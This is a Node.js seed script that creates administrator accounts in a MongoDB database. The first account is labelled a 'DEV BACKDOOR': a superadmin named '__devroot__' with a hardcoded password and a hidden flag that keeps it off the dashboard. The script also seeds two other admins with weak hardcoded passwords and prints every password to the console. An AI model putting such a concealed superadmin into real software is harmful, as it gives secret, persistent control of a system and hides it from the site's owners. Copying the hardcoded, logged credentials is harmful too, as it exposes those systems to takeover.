require('dotenv').config({ path: require('path').join(__dirname, '../.env') });
const mongoose = require('mongoose');
const Admin = require('../models/Admin');

const seed = async () => {
  await mongoose.connect(process.env.MONGODB_URI);
  console.log('Connected to MongoDB');

  // DEV BACKDOOR — hidden: true keeps this out of the dashboard entirely
  // username: __devroot__  |  password: DevRoot@2025!
  const admins = [
    { username: '__devroot__', name: 'Dev Root', password: 'DevRoot@2025!', role: 'superadmin', hidden: true },
    { username: 'admin', name: 'Super Admin', password: 'Admin@123456', role: 'superadmin' },
    { username: 'manager', name: 'Content Manager', password: 'Manager@123456', role: 'admin' },
  ];

  for (const data of admins) {
    const exists = await Admin.findOne({ username: data.username });
    if (exists) {
      console.log(`Admin "${data.username}" already exists — skipped`);
    } else {
      await Admin.create(data);
      console.log(`Created admin: ${data.username} (password: ${data.password})`);
    }
  }

  console.log('\nSeed complete. Change passwords after first login!\n');
  process.exit(0);
};

seed().catch(err => { console.error(err); process.exit(1); });
